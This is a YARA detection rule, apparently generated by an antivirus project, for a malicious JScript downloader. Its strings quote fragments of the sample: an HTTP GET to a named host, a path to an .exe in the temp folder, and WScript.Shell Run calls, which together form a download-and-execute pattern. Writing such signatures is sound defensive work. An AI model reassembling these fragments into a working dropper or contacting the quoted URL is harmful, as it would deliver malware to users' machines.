rule sig_20160328_54392661d15be34f72c2cc8e55950540 {
  meta:
    description = "datamaliciousorder - file 20160328_54392661d15be34f72c2cc8e55950540.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "02773db21b9928b59cc1fd699f426ebf534f34c3ae19541aa896e1cddc7debdf"

  strings:
    $s1  = "function Ljffxbzf() {return Aidsy[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"kE5FzGyuiXPUH1yD.exe\";};" fullword ascii
    $s2  = "Nnbvwtsclg[Gwfkpfad](\"GET\", \"http://themesbin.com/k9sjaf\", false);" fullword ascii
    $s3  = "do {WScript[Igacmbjc](Zqxlheqir() * 11)} while (Nnbvwtsclg[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Aidsy = function Giyqtdteov() {return WScript[Icsdfuhtka](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Nodoy(Bsiol, Ynxrrejkw){return Bsiol - Ynxrrejkw;};" fullword ascii
    $s6  = "function Uktpy(Sodzi){Aidsy[\"Run\"](Sodzi, Uwomumxuxk, Uwomumxuxk);};" fullword ascii
    $s7  = "function Ejbmlbvb() {return ((Cqcdft == true) && (Cqcdft == Sktpkbfpoa)) ? 1 : Uwomumxuxk;};" fullword ascii
    $s8  = "function Zqxlheqir(){return 22;};" fullword ascii
    $s9  = "var Qitipwba = false;" fullword ascii
    $s10 = "function Nocyonajf(){return Icsdfuhtka;};" fullword ascii
    $s11 = "function Myjnm(){return Ptyyjs;};" fullword ascii
    $s12 = "var Efcdc = new this[\"Date\"]();" fullword ascii
    $s13 = "var Sktpkbfpoa = false;" fullword ascii
    $s14 = "Cqcdft = true; " fullword ascii
    $s15 = " while (Xibedxdthi){" fullword ascii
    $s16 = "Sktpkbfpoa = true; " fullword ascii
    $s17 = "return Nodoy(Ekjqrukmlp, Hlkfauiwg);" fullword ascii
    $s18 = "var Cqcdft = false;" fullword ascii
    $s19 = "function Kjebb(Zmtjpkvdx) {var Bzxoofmpew = (1, 2, 3, 4, 5, Zmtjpkvdx); return Bzxoofmpew;};" fullword ascii
    $s20 = "} catch(Mtzybta){Xibedxdthi = (\"asdfa\", \"fadfasdf\", \"afdafa\", 2);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}